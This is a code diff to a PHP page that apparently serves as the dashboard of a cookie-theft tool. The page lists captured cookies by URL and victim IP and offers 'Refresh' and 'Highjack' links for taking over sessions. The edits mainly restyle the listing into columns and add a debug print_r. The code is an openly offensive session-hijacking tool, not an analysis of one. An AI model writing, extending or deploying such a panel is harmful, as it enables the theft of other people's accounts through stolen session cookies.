@@ -41,8 +41,9 @@ if(isset($_GET['action'])) {
       break;
     case 'view':
       $result = $catcher->refresh($_GET['cookieID']);
+      print_r($result);
       $message .= "<div id=\"view\">".$result."</div>";
-      print $message; die();
+      die($message);
       break;
     default:
       //do nothing
@@ -61,7 +62,7 @@ if(isset($_GET['cookieID'])) {
 ## Print Cookies to Page
 if($cookies->recordCount>0) {
   foreach($cookies->results as $cookie) {
-    $cookieResults .= "#".$cookie['id'].' - '.$cookie['url']." (".$cookie['ip'].") - <a href=\"?cookieID=".$cookie['id']."&action=refresh\">Refresh</a> - <a href=\"?cookieID=".$cookie['id']."&action=steal\">Highjack</a><br/>";
+    $cookieResults .= "<div class=\"column\">#".$cookie['id']."</div><div class=\"column\" style=\"width:50%;\">".$cookie['url']." (".$cookie['ip'].")</div><div class=\"column right\"><a href=\"?cookieID=".$cookie['id']."&action=refresh\">Refresh</a> - <a href=\"?cookieID=".$cookie['id']."&action=steal\">Highjack</a></div><br clear=\"both\"/>";
   }
 } else {
   $cookieResults = "Cookie #".$cookie['id']."not found.";
@@ -90,7 +91,9 @@ height:1500px;
 span { font-family: courier; font-size:12px; }
 #tag { padding:2px; background:#666; color:#ffffff; font-weight: normal; font-size:12px; text-align:center; width:80px;}
 #frame { width:100%; height:400px; border:1px dashed #666666; }
-
+.table { background: #ffffff; border:1px dashed #666666; opacity:0.5;}
+.column { float:left; padding:5px 15px; min-width:5%; background-color:#fff; margin-bottom:2px;}
+.right { float:right };
 </style>
 </head>
 <body>
@@ -108,7 +111,8 @@ span { font-family: courier; font-size:12px; }
 </div>
 
 <p><?php echo $message; ?></p>
-<p><?php echo $message=='' ? $cookieResults : '<a href="?">back</a>'; ?></p>
+<p>
+<div class="table"><?php echo $message=='' ? $cookieResults : '<a href="?">back</a>'; ?></p></div>
 
 </body>
 </html>
